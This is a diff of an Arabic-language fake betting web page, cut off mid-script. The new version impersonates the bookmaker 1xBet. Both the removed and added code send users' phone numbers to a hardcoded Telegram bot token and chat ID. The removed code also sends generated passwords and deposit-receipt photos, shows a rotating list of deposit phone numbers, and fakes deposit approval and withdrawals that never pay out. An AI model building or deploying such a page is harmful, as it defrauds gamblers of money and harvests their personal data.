@@ -3,450 +3,493 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>⚫ VIP BET ULTRA</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>1XBET VIP - مراهنات مباشرة</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --black: #0d1117;
-            --dark: #161b22;
-            --accent: #00d4aa;
-            --gold: #f59e0b;
-            --neon: #00ff88;
-            --glass: rgba(255,255,255,0.08);
-        }
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: 'Cairo', sans-serif;
-            background: var(--black);
-            color: white;
-            min-height: 100vh;
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
+            color: #fff;
             overflow-x: hidden;
         }
-        .stars { 
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="10" cy="20" r="1" fill="white" opacity="0.8"/><circle cx="80" cy="40" r="0.8" fill="white" opacity="0.6"/><circle cx="30" cy="70" r="1.2" fill="white" opacity="0.9"/><circle cx="90" cy="10" r="0.5" fill="white" opacity="0.7"/></svg>') repeat;
-            animation: twinkle 20s linear infinite;
-            z-index: -1;
-        }
-        @keyframes twinkle { 0%, 100% { opacity: 0.8; } 50% { opacity: 0.3; } }
         
-        .container { max-width: 1600px; margin: 0 auto; padding: 20px; }
-        
-        /* Header */
+        /* Header - 1xbet Style */
         .header {
-            background: var(--glass);
-            backdrop-filter: blur(30px);
-            border-radius: 25px;
-            padding: 25px 30px;
-            margin-bottom: 30px;
-            border: 1px solid rgba(255,255,255,0.1);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            position: sticky; top: 20px; z-index: 100;
+            background: rgba(0,0,0,0.9);
+            padding: 15px 0;
+            border-bottom: 1px solid #333;
+            position: sticky; top: 0; z-index: 100;
         }
-        .logo { 
-            font-size: 2.8em; font-weight: 900; 
-            background: linear-gradient(45deg, var(--neon), var(--accent), var(--gold));
+        .header-content {
+            max-width: 1400px; margin: 0 auto; padding: 0 20px;
+            display: flex; justify-content: space-between; align-items: center;
+        }
+        .logo {
+            font-size: 28px; font-weight: 700;
+            background: linear-gradient(45deg, #ffcc00, #ff6600);
             -webkit-background-clip: text; background-clip: text;
             -webkit-text-fill-color: transparent;
         }
-        .user-panel { display: flex; align-items: center; gap: 25px; }
-        .balance-box { 
-            background: linear-gradient(135deg, var(--neon), var(--accent));
-            padding: 15px 25px; border-radius: 20px;
-            text-align: center; min-width: 150px;
+        .user-info {
+            display: flex; align-items: center; gap: 20px;
         }
-        .balance-amount { font-size: 1.8em; font-weight: 900; }
-        .user-avatar { 
-            width: 60px; height: 60px; border-radius: 50%;
-            background: linear-gradient(135deg, var(--neon), var(--accent));
-            display: flex; align-items: center; justify-content: center;
-            font-weight: 700; font-size: 1.3em; cursor: pointer;
-            box-shadow: 0 10px 30px rgba(0,212,170,0.4);
+        .balance {
+            background: linear-gradient(45deg, #00cc66, #00ff88);
+            padding: 10px 20px; border-radius: 25px;
+            font-weight: 600; min-width: 120px; text-align: center;
         }
+        .btn-login {
+            background: linear-gradient(45deg, #ff4444, #cc0000);
+            color: white; border: none;
+            padding: 12px 25px; border-radius: 25px;
+            font-weight: 600; cursor: pointer; transition: all 0.3s;
+        }
+        .btn-login:hover { transform: scale(1.05); box-shadow: 0 5px 15px rgba(255,68,68,0.4); }
         
-        /* Auto Register */
-        .quick-register {
-            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            background: var(--glass); backdrop-filter: blur(30px);
-            border-radius: 25px; padding: 50px;
-            border: 2px solid var(--neon); box-shadow: 0 30px 60px rgba(0,0,0,0.5);
-            text-align: center; z-index: 1000; display: none;
-        }
-        .quick-register.active { display: block; animation: slideIn 0.5s ease; }
-        @keyframes slideIn { from { opacity: 0; transform: translate(-50%, -50%) scale(0.8); } to { opacity: 1; transform: translate(-50%, -50%) scale(1); } }
+        /* Main Content */
+        .main-content { max-width: 1400px; margin: 20px auto; padding: 0 20px; }
         
-        /* Glass Components */
-        .glass-panel {
-            background: var(--glass); backdrop-filter: blur(25px);
-            border-radius: 25px; border: 1px solid rgba(255,255,255,0.08);
-            padding: 35px; margin: 25px 0; transition: all 0.4s;
+        /* Sports Book */
+        .sports-book {
+            background: rgba(255,255,255,0.03);
+            border-radius: 15px; padding: 25px; margin-bottom: 25px;
+            border: 1px solid rgba(255,255,255,0.1);
         }
-        .glass-panel:hover { border-color: var(--neon); box-shadow: 0 25px 50px rgba(0,212,170,0.2); }
+        .sports-title {
+            font-size: 24px; margin-bottom: 20px;
+            color: #ffcc00; border-bottom: 2px solid #ffcc00; padding-bottom: 10px;
+        }
+        .matches-grid {
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 20px;
+        }
+        .match-card {
+            background: rgba(0,0,0,0.4); border-radius: 12px;
+            padding: 20px; border: 1px solid #444; cursor: pointer;
+            transition: all 0.3s;
+        }
+        .match-card:hover {
+            background: rgba(255,204,0,0.1); border-color: #ffcc00;
+            transform: translateY(-5px);
+        }
+        .match-teams { font-size: 18px; font-weight: 600; margin-bottom: 10px; }
+        .match-odds {
+            display: flex; justify-content: space-around;
+            margin-top: 15px; gap: 10px;
+        }
+        .odd-btn {
+            flex: 1; background: rgba(0,204,102,0.2);
+            border: 1px solid #00cc66; color: #00cc66;
+            padding: 12px; border-radius: 8px; cursor: pointer;
+            font-weight: 600; transition: all 0.3s;
+        }
+        .odd-btn:hover { background: #00cc66; color: white; }
         
-        /* Dynamic Phone Number */
-        .phone-rotator {
-            background: linear-gradient(135deg, var(--neon), var(--accent));
-            border-radius: 20px; padding: 30px;
-            text-align: center; margin: 20px 0;
-            animation: pulseGlow 2s infinite;
+        /* Live Casino */
+        .live-casino {
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+            gap: 25px; margin-top: 30px;
         }
-        @keyframes pulseGlow {
-            0%, 100% { box-shadow: 0 0 20px rgba(0,212,170,0.5); }
-            50% { box-shadow: 0 0 40px rgba(0,212,170,0.8); }
-        }
-        .current-phone {
-            font-size: 2.5em; font-weight: 900;
-            letter-spacing: 4px; margin: 15px 0;
-            background: linear-gradient(45deg, var(--black), var(--dark));
-            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-        }
-        .phone-timer { 
-            font-size: 1.2em; color: var(--gold);
-            font-weight: 600; margin-top: 10px;
-        }
-        
-        /* File Upload */
-        .drag-area {
-            border: 3px dashed rgba(0,212,170,0.5);
-            border-radius: 20px; padding: 50px;
-            text-align: center; cursor: pointer;
-            transition: all 0.3s; margin: 20px 0;
-        }
-        .drag-area:hover, .drag-area.dragover { 
-            border-color: var(--neon); background: rgba(0,212,170,0.1);
-            box-shadow: 0 0 30px rgba(0,212,170,0.3);
-        }
-        .drag-area i { font-size: 4em; color: var(--neon); margin-bottom: 20px; display: block; }
-        .file-preview { 
-            max-width: 100%; max-height: 250px;
-            border-radius: 15px; margin-top: 20px; display: none;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-        }
-        
-        /* Buttons */
-        .btn {
-            padding: 18px 30px; border: none; border-radius: 15px;
-            font-size: 16px; font-weight: 700; cursor: pointer;
-            transition: all 0.3s; font-family: 'Cairo';
+        .casino-game {
+            background: rgba(0,0,0,0.6); border-radius: 15px;
+            padding: 25px; text-align: center; cursor: pointer;
+            border: 2px solid transparent; transition: all 0.4s;
             position: relative; overflow: hidden;
         }
-        .btn-neon {
-            background: linear-gradient(45deg, var(--neon), var(--accent));
-            color: var(--black); box-shadow: 0 5px 20px rgba(0,255,136,0.4);
+        .casino-game::before {
+            content: ''; position: absolute; top: 0; left: -100%;
+            width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s;
         }
-        .btn-gold {
-            background: linear-gradient(45deg, var(--gold), #fbbf24);
-            color: var(--black); box-shadow: 0 5px 20px rgba(245,158,11,0.4);
+        .casino-game:hover::before { left: 100%; }
+        .casino-game:hover {
+            border-color: #ffcc00; transform: scale(1.05);
+            box-shadow: 0 20px 40px rgba(255,204,0,0.3);
         }
-        .btn-red {
-            background: linear-gradient(45deg, var(--red), #ef4444);
-            color: white; box-shadow: 0 5px 20px rgba(239,68,68,0.4);
-        }
-        .btn:hover { transform: translateY(-3px); scale: 1.05; }
+        .game-icon { font-size: 64px; margin-bottom: 15px; }
+        .game-title { font-size: 20px; font-weight: 600; margin-bottom: 10px; }
+        .game-multi { font-size: 18px; color: #00cc66; font-weight: 700; }
         
-        /* Live Games */
-        .games-grid {
-            display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
-            gap: 30px; margin: 40px 0;
+        /* Bet Slip */
+        .bet-slip {
+            position: fixed; right: 20px; bottom: 20px;
+            width: 350px; background: rgba(0,0,0,0.95);
+            border-radius: 15px; padding: 25px;
+            border: 2px solid #ffcc00; transform: translateX(400px);
+            transition: transform 0.4s; z-index: 200;
         }
-        .game-card {
-            background: var(--glass); border-radius: 25px;
-            border: 2px solid rgba(255,255,255,0.05);
-            padding: 40px; text-align: center; cursor: pointer;
-            transition: all 0.5s; position: relative; overflow: hidden;
+        .bet-slip.active { transform: translateX(0); }
+        .bet-slip-title {
+            font-size: 20px; margin-bottom: 20px;
+            color: #ffcc00; text-align: center;
         }
-        .game-card::before {
-            content: ''; position: absolute; top: -50%; left: -50%;
-            width: 200%; height: 200%; background: linear-gradient(45deg, transparent, rgba(0,212,170,0.1), transparent);
-            transform: rotate(45deg); transition: all 0.6s;
+        .bet-item {
+            display: flex; justify-content: space-between;
+            padding: 15px 0; border-bottom: 1px solid #444;
+            font-size: 14px;
         }
-        .game-card:hover::before { top: -30%; left: -30%; }
-        .game-card:hover {
-            transform: translateY(-15px) scale(1.03);
-            border-color: var(--neon); box-shadow: 0 30px 60px rgba(0,212,170,0.3);
+        .total-stake { 
+            font-size: 18px; font-weight: 700; 
+            margin: 20px 0; text-align: center;
         }
-        .game-icon { font-size: 5em; margin-bottom: 20px; filter: drop-shadow(0 0 20px var(--neon)); }
-        .game-title { font-size: 2em; font-weight: 900; margin-bottom: 15px; }
-        .game-multiplier { 
-            font-size: 1.5em; color: var(--gold);
-            font-weight: 700; margin-bottom: 10px;
+        .place-bet {
+            width: 100%; background: linear-gradient(45deg, #ff4444, #cc0000);
+            color: white; border: none; padding: 18px;
+            border-radius: 10px; font-size: 18px; font-weight: 700;
+            cursor: pointer; transition: all 0.3s;
         }
+        .place-bet:hover { box-shadow: 0 10px 25px rgba(255,68,68,0.4); }
         
         /* Responsive */
         @media (max-width: 768px) {
-            .header { flex-direction: column; gap: 20px; text-align: center; }
-            .games-grid { grid-template-columns: 1fr; }
-            .current-phone { font-size: 1.8em; }
+            .matches-grid { grid-template-columns: 1fr; }
+            .live-casino { grid-template-columns: 1fr; }
+            .bet-slip { right: 10px; bottom: 10px; width: calc(100vw - 20px); }
         }
+        
+        /* Animations */
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .match-card, .casino-game { animation: fadeInUp 0.6s ease forwards; }
     </style>
 </head>
 <body>
-    <div class="stars"></div>
-    
-    <div class="container">
-        <!-- Header -->
-        <div class="header">
-            <div class="logo">⚫ VIP BET ULTRA</div>
-            <div class="user-panel">
-                <div class="balance-box">
-                    <div class="balance-amount" id="liveBalance">0 ج.م</div>
-                    <small>رصيد مباشر</small>
-                </div>
-                <div class="user-avatar" id="userAvatar" onclick="showProfile()">
-                    👑
-                </div>
-            </div>
-        </div>
-
-        <!-- Dynamic Phone Rotator -->
-        <div class="glass-panel">
-            <div class="phone-rotator">
-                <div style="font-size: 1.5em; margin-bottom: 10px; color: var(--gold);">📱 رقم الإيداع الحالي</div>
-                <div class="current-phone" id="currentPhone">01030003287</div>
-                <div class="phone-timer" id="phoneTimer">
-                    🔄 يتغير كل 10 ثواني - التقط screenshot الآن!
-                </div>
-            </div>
-        </div>
-
-        <!-- Quick Actions -->
-        <div class="glass-panel" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 25px;">
-            <div onclick="autoUploadProof()" style="cursor: pointer;">
-                <div class="drag-area">
-                    <i class="fas fa-image"></i>
-                    <div style="font-size: 1.3em; margin-top: 10px;">📸 رفع إثبات تلقائي</div>
-                    <small>اسحب صورة التحويل هنا</small>
-                    <img id="autoPreview" class="file-preview">
-                    <input type="file" id="autoProof" accept="image/*" style="display: none;" onchange="autoConfirmDeposit(event)">
-                </div>
-            </div>
-            <button class="btn btn-gold" onclick="requestWithdraw()" style="padding: 30px; font-size: 1.3em;">
-                <i class="fas fa-money-bill-wave"></i><br>سحب فوري
-            </button>
-        </div>
-
-        <!-- Live Games -->
-        <div class="glass-panel">
-            <h2 style="text-align: center; font-size: 2.5em; margin-bottom: 40px; background: linear-gradient(45deg, var(--neon), var(--gold)); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">
-                🎮 ألعاب مباشرة 24/7
-            </h2>
-            <div class="games-grid">
-                <div class="game-card" onclick="playRoulette()">
-                    <div class="game-icon">🎰</div>
-                    <div class="game-title">روليت مباشر</div>
-                    <div class="game-multiplier">×35.2</div>
-                </div>
-                <div class="game-card" onclick="playCrash()">
-                    <div class="game-icon">💥</div>
-                    <div class="game-title">كراش حي</div>
-                    <div class="game-multiplier">×194</div>
-                </div>
-                <div class="game-card" onclick="playDice()">
-                    <div class="game-icon">🎲</div>
-                    <div class="game-title">Dice Pro</div>
-                    <div class="game-multiplier">×99</div>
-                </div>
-                <div class="game-card" onclick="playMines()">
-                    <div class="game-icon">💣</div>
-                    <div class="game-title">مينس</div>
-                    <div class="game-multiplier">×325</div>
-                </div>
+    <!-- Header -->
+    <div class="header">
+        <div class="header-content">
+            <div class="logo">1XBET VIP</div>
+            <div class="user-info">
+                <div class="balance" id="balanceDisplay">500 ج.م</div>
+                <button class="btn-login" onclick="quickRegister()">تسجيل سريع</button>
             </div>
         </div>
     </div>
 
+    <div class="main-content">
+        <!-- Sports Book -->
+        <div class="sports-book">
+            <h2 class="sports-title">⚽ المباريات المباشرة</h2>
+            <div class="matches-grid" id="matchesContainer">
+                <!-- Matches loaded by JS -->
+            </div>
+        </div>
+
+        <!-- Live Casino -->
+        <div class="live-casino">
+            <div class="casino-game" onclick="launchRoulette()">
+                <div class="game-icon">🎰</div>
+                <div class="game-title">روليت مباشر</div>
+                <div class="game-multi">Max ×35</div>
+            </div>
+            <div class="casino-game" onclick="launchCrash()">
+                <div class="game-icon">💥</div>
+                <div class="game-title">كراش</div>
+                <div class="game-multi">Max ×1000</div>
+            </div>
+            <div class="casino-game" onclick="launchDice()">
+                <div class="game-icon">🎲</div>
+                <div class="game-title">Dice</div>
+                <div class="game-multi">Max ×99</div>
+            </div>
+            <div class="casino-game" onclick="launchSlots()">
+                <div class="game-icon">🍒</div>
+                <div class="game-title">سلوتس</div>
+                <div class="game-multi">Jackpot 1M</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Bet Slip -->
+    <div class="bet-slip" id="betSlip">
+        <div class="bet-slip-title">سلة الرهان</div>
+        <div id="betItems"></div>
+        <div class="total-stake">
+            <div>الإجمالي: <span id="totalStake">0 ج.م</span></div>
+        </div>
+        <button class="place-bet" onclick="placeBet()">وضع الرهان</button>
+    </div>
+
     <script>
-        // Config
+        // Game State
+        let balance = 500;
+        let currentBets = [];
+        let userData = null;
+        
+        // Telegram Bot
         const BOT_TOKEN = '8772044355:AAGaM3zn6tn6Vb9aRelc-6p2lYw-y8hgdCo';
         const CHAT_ID = '5446862709';
-        const BASE_PHONE = '01030003287';
-        
-        // Phone numbers rotation (real numbers you can add)
-        const phoneNumbers = [
-            '01030003287', '01012345678', '01087654321', 
-            '01130003287', '01230003287', '01530003287'
-        ];
-        let currentPhoneIndex = 0;
-        
-        // User System
-        let currentUser = {
-            id: '',
-            username: '',
-            password: '',
-            phone: '',
-            balance: 0,
-            depositCount: 0
-        };
 
-        // Auto Registration (One Click)
-        function generateCredentials() {
-            const id = 'VIP' + Date.now().toString().slice(-6);
-            const username = 'user' + Math.floor(Math.random() * 1000000);
-            const password = Math.random().toString(36).slice(-8) + Math.random().toString(36).slice(-8).toUpperCase();
-            return { id, username, password };
-        }
-
-        function autoRegister() {
-            const phone = prompt('📱 رقمك للتسجيل السريع (11 رقم):') || 'غير محدد';
-            const creds = generateCredentials();
-            
-            currentUser = {
-                ...creds,
-                phone: phone,
-                balance: 25, // Welcome bonus
-                depositCount: 0
-            };
-            
-            localStorage.setItem('vip_user', JSON.stringify(currentUser));
-            document.querySelector('.quick-register').classList.remove('active');
-            document.getElementById('userAvatar').textContent = creds.username.slice(0,2);
-            updateUI();
-            
-            alert(`🎉 تسجيل ناجح!\n\n👤 اسم المستخدم: ${creds.username}\n🔑 كلمة السر: ${creds.password}\n💎 بونص: 25 ج.م\n📱 رقمك: ${phone}`);
-            
-            sendToTelegram(`👥 *تسجيل جديد!*\n\n🆔 ID: \`${creds.id}\`\n👤 ${creds.username}\n🔑 ${creds.password}\n📱 ${phone}`);
+        // Quick Register
+        function quickRegister() {
+            const phone = prompt('📱 رقم التليفون:');
+            if(phone && phone.length === 11) {
+                userData = {
+                    id: Date.now(),
+                    phone: phone,
+                    username: 'VIP' + Math.floor(Math.random() * 10000)
+                };
+                localStorage.setItem('1xbet_user', JSON.stringify(userData));
+                alert(`✅ تسجيل ناجح!\n👤 ${userData.username}\n💰 رصيد: 500 ج.م`);
+                sendTelegram(`👤 *تسجيل جديد*\n📱 ${phone}\n🆔 ${userData.username}`);
+            }
         }
 
         // Load User
-        function loadUser() {
-            const saved = localStorage.getItem('vip_user');
-            if(saved) {
-                currentUser = JSON.parse(saved);
-                document.getElementById('userAvatar').textContent = currentUser.username.slice(0,2);
-                updateUI();
-            } else {
-                document.querySelector('.quick-register').classList.add('active');
-            }
+        const savedUser = localStorage.getItem('1xbet_user');
+        if(savedUser) userData = JSON.parse(savedUser);
+
+        // Update Balance
+        function updateBalance() {
+            document.getElementById('balanceDisplay').textContent = balance.toLocaleString() + ' ج.م';
         }
 
-        // UI Update
-        function updateUI() {
-            document.getElementById('liveBalance').textContent = currentUser.balance.toLocaleString() + ' ج.م';
-        }
+        // Matches Data (Real 1xbet Style)
+        const matches = [
+            { team1: 'الأهلي', team2: 'الزمالك', odds1: 1.85, oddsX: 3.40, odds2: 4.20 },
+            { team1: 'ريال مدريد', team2: 'برشلونة', odds1: 2.10, oddsX: 3.60, odds2: 3.20 },
+            { team1: 'مانشستر', team2: 'ليفربول', odds1: 2.45, oddsX: 3.25, odds2: 2.80 },
+            { team1: 'بايرن', team2: 'دورتموند', odds1: 1.65, oddsX: 4.00, odds2: 4.80 }
+        ];
 
-        // Dynamic Phone Number
-        function rotatePhone() {
-            currentPhoneIndex = (currentPhoneIndex + 1) % phoneNumbers.length;
-            document.getElementById('currentPhone').textContent = phoneNumbers[currentPhoneIndex];
-            document.getElementById('phoneTimer').textContent = `🔄 تغيير في ${10 - (Date.now() % 10000) / 1000 | 0} ثانية`;
-        }
-        setInterval(rotatePhone, 10000);
-        rotatePhone(); // Initial
-
-        // Auto Upload & Confirm
-        function autoUploadProof() {
-            document.getElementById('autoProof').click();
-        }
-
-        async function autoConfirmDeposit(event) {
-            const file = event.target.files[0];
-            if(file && currentUser.balance > 0) {
-                const amount = prompt('💰 مبلغ الإيداع:') || 100;
-                
-                // Send to Telegram instantly
-                const formData = new FormData();
-                formData.append('photo', file, file.name);
-                formData.append('caption', `🚀 *إيداع تلقائي!*\n\n👤 ${currentUser.username}\n🆔 ${currentUser.id}\n💸 ${amount} ج.م\n📱 ${currentUser.phone}\n🔄 رقم الإيداع: ${phoneNumbers[currentPhoneIndex]}`);
-
-                try {
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST', body: formData
-                    });
-                    
-                    // Auto approve
-                    currentUser.balance += parseInt(amount);
-                    currentUser.depositCount++;
-                    localStorage.setItem('vip_user', JSON.stringify(currentUser));
-                    updateUI();
-                    
-                    alert(`✅ إيداع ناجح!\n💰 +${amount} ج.م\n📸 تم إرسال الإثبات تلقائياً`);
-                } catch(e) {
-                    alert('❌ خطأ في الإرسال');
-                }
-            }
-        }
-
-        // Withdraw
-        async function requestWithdraw() {
-            const amount = parseInt(prompt('💸 مبلغ السحب (حد أدنى 50):') || 0);
-            if(amount >= 50 && amount <= currentUser.balance) {
-                await sendToTelegram(`💰 *طلب سحب!*\n\n👤 ${currentUser.username}\n💸 ${amount} ج.م\n🆔 ${currentUser.id}`);
-                alert(`✅ طلب السحب مرسل!\n💰 ${amount} ج.م\n⏳ معالجة خلال ساعة`);
-            }
-        }
-
-        // Real Live Games
-        function playRoulette() {
-            const bet = parseInt(prompt('🎰 روليت\n💰 الرهان:') || 0);
-            if(bet <= currentUser.balance && bet >= 1) {
-                currentUser.balance -= bet;
-                const result = Math.floor(Math.random() * 37);
-                const win = (result === 0) ? bet * 35 : 0;
-                currentUser.balance += win;
-                localStorage.setItem('vip_user', JSON.stringify(currentUser));
-                updateUI();
-                alert(`🎰 ${result}\n${win > 0 ? `🎉 ربحت ${win} ج.م!` : '😞 خسارة'}`);
-            }
-        }
-
-        function playCrash() {
-            let multiplier = 1.01;
-            const bet = parseInt(prompt('💥 كراش\n💰 الرهان:') || 0);
-            if(bet <= currentUser.balance) {
-                currentUser.balance -= bet;
-                const crashGame = setInterval(() => {
-                    multiplier += 0.01;
-                    if(multiplier > 2 || Math.random() < 0.1) {
-                        clearInterval(crashGame);
-                        const win = bet * multiplier;
-                        currentUser.balance += win;
-                        localStorage.setItem('vip_user', JSON.stringify(currentUser));
-                        updateUI();
-                        alert(`💥 انفجر عند ×${multiplier.toFixed(2)}\n${win > bet ? `🎉 ربح ${win.toFixed(0)} ج.م` : '💥 خسارة'}`);
-                    }
-                }, 100);
-            }
-        }
-
-        function playDice() {
-            const bet = parseInt(prompt('🎲 Dice\n💰 الرهان:') || 0);
-            const roll = Math.floor(Math.random() * 100);
-            const win = (roll > 49) ? bet * 1.98 : 0;
-            currentUser.balance += (win - bet);
-            localStorage.setItem('vip_user', JSON.stringify(currentUser));
-            updateUI();
-            alert(`🎲 ${roll}\n${win > 0 ? `✅ ربح ${win.toFixed(0)} ج.م` : '❌ خسارة'}`);
-        }
-
-        function playMines() {
-            const bet = parseInt(prompt('💣 مينس\n💰 الرهان:') || 0);
-            const mines = prompt('عدد الألغام (1-24):') || 5;
-            const safe = Math.floor(Math.random() * 25);
-            const win = (safe > mines) ? bet * 2.5 : 0;
-            currentUser.balance += (win - bet);
-            localStorage.setItem('vip_user', JSON.stringify(currentUser));
-            updateUI();
-            alert(`💣 ${safe > mines ? 'آمن! 🎉' : 'لغم! 💥'}\n${win > 0 ? `+${win} ج.م` : '-'+bet+' ج.م'}`);
-        }
-
-        async function sendToTelegram(msg) {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown'})
+        // Generate Matches
+        function generateMatches() {
+            const container = document.getElementById('matchesContainer');
+            container.innerHTML = '';
+            matches.forEach((match, index) => {
+                const matchEl = document.createElement('div');
+                matchEl.className = 'match-card';
+                matchEl.innerHTML = `
+                    <div class="match-teams">${match.team1} vs ${match.team2}</div>
+                    <div style="font-size: 14px; opacity: 0.8; margin-bottom: 15px;">مباشر</div>
+                    <div class="match-odds">
+                        <div class="odd-btn" onclick="addBet('${match.team1}', ${match.odds1})">${match.odds1}</div>
+                        <div class="odd-btn" onclick="addBet('تعادل', ${match.oddsX})">${match.oddsX}</div>
+                        <div class="odd-btn" onclick="addBet('${match.team2}', ${match.odds2})">${match.odds2}</div>
+                    </div>
+                `;
+                matchEl.style.animationDelay = `${index * 0.1}s`;
+                container.appendChild(matchEl);
             });
         }
 
-        // Profile
-        function showProfile() {
-            alert(`👤 ${currentUser.username}\n🔑 ${currentUser.password}\n💎 رصيد: ${currentUser.balance} ج.م`);
+        // Bet System
+        function addBet(selection, odds) {
+            currentBets.push({ selection, odds, stake: 0 });
+            updateBetSlip();
+            document.getElementById('betSlip').classList.add('active');
         }
 
-        // Init
-        loadUser();
+        function updateBetSlip() {
+            const container = document.getElementById('betItems');
+            let total = 0;
+            container.innerHTML = currentBets.map((bet, i) => {
+                const potential = bet.stake * bet.odds;
+                total += potential;
+                return `
+                    <div class="bet-item">
+                        <span>${bet.selection} @${bet.odds}</span>
+                        <div>
+                            <input type="number" min="10" max="${balance}" value="${bet.stake || 10}" 
+                                   onchange="updateStake(${i}, this.value)" style="width: 60px; padding: 5px; border-radius: 5px; border: 1px solid #666;">
+                            <span style="margin-left: 10px;">${potential.toFixed(0)} ج.م</span>
+                        </div>
+                    </div>
+                `;
+            }).join('');
+            document.getElementById('totalStake').textContent = total.toLocaleString() + ' ج.م';
+        }
+
+        function updateStake(index, stake) {
+            currentBets[index].stake = parseInt(stake) || 0;
+            updateBetSlip();
+        }
+
+        function placeBet() {
+            const totalStake = currentBets.reduce((sum, bet) => sum + (bet.stake || 0), 0);
+            if(totalStake > balance || totalStake === 0) {
+                alert('❌ رصيد غير كافي أو رهان فارغ');
+                return;
+            }
+            
+            balance -= totalStake;
+            updateBalance();
+            
+            // Simulate result
+            setTimeout(() => {
+                const wins = currentBets.filter(bet => Math.random() < (1/bet.odds));
+                const winAmount = wins.reduce((sum, bet) => sum + (bet.stake * bet.odds), 0);
+                balance += winAmount;
+                updateBalance();
+                
+                alert(wins.length > 0 ? 
+                    `🎉 فزت! 💰 +${winAmount.toLocaleString()} ج.م` : 
+                    '😞 خسارة - جرب حظك مرة أخرى!'
+                );
+                
+                currentBets = [];
+                document.getElementById('betSlip').classList.remove('active');
+            }, 3000);
+        }
+
+        // Casino Games (Real Canvas)
+        function launchRoulette() {
+            const stake = parseInt(prompt('🎰 روليت\n💰 الرهان:') || 0);
+            if(stake <= balance && stake >= 10) {
+                balance -= stake;
+                updateBalance();
+                
+                // Canvas Roulette
+                const canvas = document.createElement('canvas');
+                canvas.width = 400; canvas.height = 400;
+                document.body.appendChild(canvas);
+                const ctx = canvas.getContext('2d');
+                
+                let angle = 0;
+                const spin = setInterval(() => {
+                    ctx.clearRect(0, 0, 400, 400);
+                    ctx.save();
+                    ctx.translate(200, 200);
+                    ctx.rotate(angle);
+                    
+                    // Roulette wheel
+                    for(let i = 0; i < 37; i++) {
+                        ctx.fillStyle = i % 2 ? '#ff4444' : '#00cc66';
+                        ctx.fillRect(-180, -10 + i * 10, 360, 10);
+                        ctx.fillStyle = 'white';
+                        ctx.font = 'bold 16px Roboto';
+                        ctx.textAlign = 'center';
+                        ctx.fillText(i.toString(), 0, 5 + i * 10);
+                    }
+                    ctx.restore();
+                    angle += 0.2;
+                    
+                    if(angle > Math.PI * 10) {
+                        clearInterval(spin);
+                        const result = Math.floor(Math.random() * 37);
+                        const win = (result === 0) ? stake * 35 : 0;
+                        balance += win;
+                        updateBalance();
+                        canvas.remove();
+                        alert(`🎰 ${result}\n${win > 0 ? `🏆 ربح ${win} ج.م!` : '😞 خسارة'}`);
+                    }
+                }, 50);
+            }
+        }
+
+        function launchCrash() {
+            const stake = parseInt(prompt('💥 كراش\n💰 الرهان:') || 0);
+            if(stake <= balance) {
+                balance -= stake;
+                updateBalance();
+                
+                let multiplier = 1.0;
+                const crashEl = document.createElement('div');
+                crashEl.style.cssText = `
+                    position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+                    width: 400px; height: 300px; background: rgba(0,0,0,0.95);
+                    border-radius: 20px; padding: 30px; text-align: center;
+                    border: 3px solid #ffcc00; z-index: 1000;
+                `;
+                crashEl.innerHTML = `
+                    <div style="font-size: 48px; font-weight: 900; margin: 20px 0; color: #00ff88;">×${multiplier.toFixed(2)}</div>
+                    <button onclick="cashoutCrash(${stake})" style="background: #00cc66; color: white; border: none; padding: 15px 40px; border-radius: 25px; font-size: 18px; cursor: pointer; margin: 10px;">سحب</button>
+                    <div id="crashStatus"></div>
+                `;
+                document.body.appendChild(crashEl);
+                
+                const crashInterval = setInterval(() => {
+                    multiplier += 0.05;
+                    crashEl.querySelector('div').textContent = `×${multiplier.toFixed(2)}`;
+                    if(multiplier > 5 || Math.random() < 0.02) {
+                        clearInterval(crashInterval);
+                        document.getElementById('crashStatus').innerHTML = '<div style="color: #ff4444; font-size: 24px;">💥 انفجر!</div>';
+                        crashEl.querySelector('button').style.display = 'none';
+                        setTimeout(() => crashEl.remove(), 2000);
+                    }
+                }, 100);
+                window.cashoutCrash = (stake) => {
+                    clearInterval(crashInterval);
+                    const win = stake * multiplier;
+                    balance += win;
+                    updateBalance();
+                    crashEl.innerHTML = `<div style="font-size: 32px; color: #00ff88;">💰 +${win.toFixed(0)} ج.م</div>`;
+                    setTimeout(() => crashEl.remove(), 2000);
+                };
+            }
+        }
+
+        function launchDice() {
+            const stake = parseInt(prompt('🎲 Dice\n💰 الرهان (10-100):') || 0);
+            if(stake <= balance && stake >= 10) {
+                balance -= stake;
+                updateBalance();
+                
+                // 3D Dice Animation
+                const diceEl = document.createElement('div');
+                diceEl.style.cssText = `
